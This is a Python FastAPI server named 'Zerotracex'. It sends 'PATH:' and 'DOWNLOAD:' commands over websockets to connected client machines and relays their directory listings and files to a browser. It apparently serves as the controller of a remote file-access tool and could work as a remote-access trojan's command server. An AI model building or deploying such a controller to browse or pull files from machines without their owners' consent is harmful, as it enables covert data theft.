from fastapi import FastAPI, WebSocket, Request
from fastapi.responses import HTMLResponse, Response
from fastapi.staticfiles import StaticFiles
import uvicorn
from typing import Dict
import json
import os
from datetime import datetime
import asyncio
from pathlib import Path

from .models.client import ClientData
from .handlers.file_manager import FileManagerHandler

# Make app available for import
app = FastAPI(title="Zerotracex")
file_manager = FileManagerHandler()

# Store connected clients
clients: Dict[str, ClientData] = {}
websocket_clients: Dict[str, WebSocket] = {}

# Store last known directory state
directory_cache: Dict[str, dict] = {}

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    await websocket.accept()
    client_id = f"{websocket.client.host}:{websocket.client.port}"
    
    try:
        # Create client data
        client_data = ClientData((websocket.client.host, websocket.client.port))
        clients[websocket.client.host] = client_data
        websocket_clients[websocket.client.host] = websocket
        
        # Request initial directory listing
        await websocket.send_text("PATH:.")
        
        while True:
            try:
                message = await websocket.receive()
                message_type = message.get("type")
                
                if message_type == "websocket.disconnect":
                    break
                
                if message_type == "websocket.receive":
                    data = message.get("text") or message.get("bytes")
                    if not data:
                        continue
                    
                    if isinstance(data, str):
                        # Handle JSON directory data
                        files_data = json.loads(data)
                        client_data.files = files_data
                        client_data.last_update = datetime.now()
                        directory_cache[client_data.current_path] = files_data
                    else:
                        # Handle binary file data
                        client_data.last_file_data = data
                        
            except Exception as e:
                print(f"[!] Error processing message: {e}")
                continue
            
    except Exception as e:
        print(f"[!] Error handling websocket client {client_id}: {e}")
    finally:
        if websocket.client.host in clients:
            del clients[websocket.client.host]
        if websocket.client.host in websocket_clients:
            del websocket_clients[websocket.client.host]
        print(f"[-] WebSocket client disconnected: {client_id}")

@app.get("/", response_class=HTMLResponse)
async def get_directory(request: Request):
    # For web browser requests, use the connected client's data
    connected_clients = list(clients.keys())
    if not connected_clients:
        return HTMLResponse(content="No clients connected", status_code=404)
    
    # Use the first connected client
    client_ip = connected_clients[0]
    client_data = clients[client_ip]
    
    path = request.query_params.get('path', '.')
    
    # Request fresh directory contents from client
    websocket = websocket_clients.get(client_ip)
    if websocket:
        try:
            # Send path request
            await websocket.send_text(f"PATH:{path}")
            client_data.current_path = path
            
            # Wait for response with timeout
            try:
                for _ in range(10):  # Try for 1 second (10 * 0.1)
                    if path in directory_cache:
                        client_data.files = directory_cache[path]
                        break
                    await asyncio.sleep(0.1)
            except asyncio.TimeoutError:
                print(f"Timeout waiting for directory contents: {path}")
        except Exception as e:
            print(f"Error requesting directory contents: {e}")
    
        html_content = file_manager.generate_directory_listing(client_data, path)
        return HTMLResponse(content=html_content)

@app.get("/download")
async def download_file(request: Request, path: str):
    connected_clients = list(clients.keys())
    if not connected_clients:
        return HTMLResponse(content="No clients connected", status_code=404)
    
    client_ip = connected_clients[0]
    websocket = websocket_clients.get(client_ip)
    client_data = clients[client_ip]
    
    if websocket:
        try:
            # Clear any previous file data
            client_data.last_file_data = None
            
            # Request file from client
            await websocket.send_text(f"DOWNLOAD:{path}")
            
            # Wait for file data response with timeout
            for _ in range(50):  # 5 seconds timeout
                if client_data.last_file_data is not None:
                    file_data = client_data.last_file_data
                    client_data.last_file_data = None  # Clear after use
                    
                    filename = os.path.basename(path)
                    return Response(
                        content=file_data,
                        media_type='application/octet-stream',
                        headers={
                            'Content-Disposition': f'attachment; filename="{filename}"'
                        }
                    )
                await asyncio.sleep(0.1)
            
            return HTMLResponse(content="Download timeout", status_code=408)
            
        except Exception as e:
            print(f"Error downloading file: {e}")
            return HTMLResponse(content="Download error", status_code=500)
    
    return HTMLResponse(content="Client not connected", status_code=404)

def start(host="0.0.0.0", port=8080):
    print(f"[*] Server starting on http://{host}:{port}")
    print(f"[*] Local access: http://127.0.0.1:{port}")
    print(f"[*] Network access: http://{get_local_ip()}:{port}")
    uvicorn.run(app, host=host, port=port)

def get_local_ip():
    try:
        # Get local IP address
        import socket
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "0.0.0.0"

if __name__ == "__main__":
    start() 
